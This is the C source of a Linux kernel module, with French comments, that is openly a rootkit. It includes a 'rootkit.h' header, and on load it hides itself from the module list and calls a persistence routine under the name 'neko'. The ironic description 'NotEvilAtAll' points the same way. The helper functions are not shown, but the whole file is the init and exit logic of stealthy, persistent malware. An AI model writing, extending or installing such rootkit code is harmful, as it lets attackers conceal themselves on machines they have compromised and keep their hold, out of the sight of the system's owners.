#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "rootkit.h"

/* Initialisation du module principal */
static int __init my_module_init(void)
{
    if (hide_init(THIS_MODULE) != 0)
        return -EINVAL;
    hide(THIS_MODULE, 1);
    const char *module_name = "neko"; 
    enable_persistence(module_name); 
    return 0;
}

/* Nettoyage du module principal */
static void __exit my_module_exit(void)
{
    hide(THIS_MODULE, 0); 
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("NotEvilAtAll");
MODULE_AUTHOR("2600");